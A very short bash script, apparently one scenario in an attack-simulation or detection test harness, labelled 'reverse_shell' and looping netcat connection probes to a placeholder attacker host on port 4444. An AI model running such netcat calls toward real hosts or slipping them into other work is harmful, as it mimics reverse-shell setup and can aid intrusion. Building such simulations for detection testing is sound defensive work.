#!/usr/bin/env bash
ATTACK=reverse_shell; . "$(dirname "$0")/_lib.sh"
run "for i in 1 2 3; do nc -z -w1 $ATTACKER 4444; done"
